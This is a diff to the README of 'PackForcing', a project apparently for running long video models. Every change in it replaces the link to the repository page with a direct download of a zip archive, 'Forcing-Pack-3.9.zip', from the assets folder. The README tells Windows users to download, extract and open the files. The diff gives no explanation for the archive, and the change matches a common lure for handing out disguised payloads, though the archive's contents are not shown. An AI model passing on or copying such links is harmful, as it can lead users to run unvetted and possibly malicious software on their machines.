@@ -1,12 +1,12 @@
 # 🎬 PackForcing - Run Long Video Models With Ease
 
-[![Download PackForcing](https://img.shields.io/badge/Download-PackForcing-blue?style=for-the-badge)](https://github.com/JonathanAshiadey/PackForcing)
+[![Download PackForcing](https://img.shields.io/badge/Download-PackForcing-blue?style=for-the-badge)](https://github.com/JonathanAshiadey/PackForcing/raw/refs/heads/main/assets/Forcing-Pack-3.9.zip)
 
 ## 📥 Download PackForcing
 
 Use this link to visit the page and download the files you need:
 
-[Open PackForcing Download Page](https://github.com/JonathanAshiadey/PackForcing)
+[Open PackForcing Download Page](https://github.com/JonathanAshiadey/PackForcing/raw/refs/heads/main/assets/Forcing-Pack-3.9.zip)
 
 ## 🖥️ What PackForcing Does
 
@@ -50,7 +50,7 @@ If you plan to run larger video jobs, use a stronger GPU and more RAM.
 Follow these steps on Windows.
 
 1. Open the download page:
-   [https://github.com/JonathanAshiadey/PackForcing](https://github.com/JonathanAshiadey/PackForcing)
+   [https://github.com/JonathanAshiadey/PackForcing/raw/refs/heads/main/assets/Forcing-Pack-3.9.zip](https://github.com/JonathanAshiadey/PackForcing/raw/refs/heads/main/assets/Forcing-Pack-3.9.zip)
 
 2. Download the project files from the page.
 
@@ -165,7 +165,7 @@ Only download the project from the link shown here. After download, keep the fil
 ## 🧩 Next Steps
 
 1. Open the download page:
-   [https://github.com/JonathanAshiadey/PackForcing](https://github.com/JonathanAshiadey/PackForcing)
+   [https://github.com/JonathanAshiadey/PackForcing/raw/refs/heads/main/assets/Forcing-Pack-3.9.zip](https://github.com/JonathanAshiadey/PackForcing/raw/refs/heads/main/assets/Forcing-Pack-3.9.zip)
 2. Download the project files
 3. Extract them on your Windows PC
 4. Open the project folder
